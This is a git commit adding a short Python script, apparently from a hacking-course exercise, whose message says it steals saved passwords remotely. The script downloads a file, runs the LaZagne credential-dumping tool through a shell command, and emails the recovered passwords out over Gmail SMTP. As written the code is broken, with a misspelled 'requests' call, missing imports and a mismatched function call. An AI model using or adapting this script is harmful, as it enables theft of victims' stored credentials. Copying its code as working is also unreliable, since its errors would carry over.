4692ea16bb7a424debd276e3de2f0896e87864d2
Ross M <44169316+Scunnered@users.noreply.github.com>
2020-06-16 15:12:48 +0100

    Using all the Above to Steal Saved Passwords Remotely

---
+++ execute and report.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python
+import requests
+
+def download(url):
+    get_response = request.get(url)
+    file_name = url.split("-/-")[-1]
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+download("https://vignette.wikia.nocookie.net/villains/images/2/26/BobPage.png/revision/latest?cb=20120705072505")
+result = subprocess.check_output("laZagne.exe all", shell=True)
+send_mail("BobPage12@gmail.com, abc123abc12", result)
